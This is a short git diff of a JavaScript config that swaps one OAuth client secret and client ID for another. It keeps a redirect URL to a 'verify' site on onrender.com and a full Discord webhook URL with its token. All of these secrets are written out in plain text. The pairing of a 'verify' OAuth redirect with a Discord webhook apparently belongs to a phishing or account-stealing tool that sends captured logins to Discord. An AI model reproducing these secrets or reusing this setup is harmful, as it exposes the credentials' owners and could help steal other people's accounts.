@@ -1,6 +1,6 @@
 //Change these btw
-const client_secret = 'bVV8Q~-fa1V~q4Mod0nTKT0G9hd1D2NHTMWdEcfT' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = 'fb01239b-30e5-4938-9c82-485a709d92b1'
+const client_secret = 'JQ68Q~aA2GbK3lPmlRyzreCfHaXTpXszqXLU3cTu' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '1e286315-a0cf-4aca-8822-96f6b7f47297'
 const redirect_uri = 'https://verify-h8je.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1048927881016909925/BP_G-rNFa_l2hYZSZS-gHPe7dorSDNf7djILvAjmQ2W7iDsuhfXQd05KBnLaP1mB7t5c                             '
 
